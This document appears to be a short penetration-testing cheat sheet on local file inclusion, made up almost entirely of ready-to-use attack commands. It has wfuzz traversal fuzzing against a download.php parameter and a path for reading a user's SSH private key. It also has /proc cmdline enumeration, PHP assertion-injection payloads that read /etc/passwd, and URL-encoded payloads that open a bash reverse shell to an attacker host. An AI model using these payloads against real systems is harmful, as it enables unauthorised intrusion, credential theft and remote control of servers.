### :open_file_folder: Check file

lists

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt

Check files

```
wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=FUZZ
```

Next, we can test reading the ssh key

```
../../../../../home/<username>/.ssh/id_rsa
```

### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)

```
wfuzz -u http://<target ip>/download.php?downloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1

curl http://<target ip>/download.php?downloadurl=/proc/824/cmdline --output service.txt
```

PHP assertions

```shell
page=' and die(show_source('/etc/passwd')) or '
page=' and die(system('cat /etc/passwd')) or '
# url encode , page=<encode command string>, escape single quotes 
# page=' and die(system('echo \'/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1\' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh')) or '
page=' and die(system('echo '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F<attacker ip>%2F<attacker port> 0>%261' > %2Ftmp%2Frevshell.sh %26%26 chmod 777 %2Ftmp%2Frevshell.sh %26%26 %2Fbin%2Fbash %2Ftmp%2Frevshell.sh')) or '%0A
```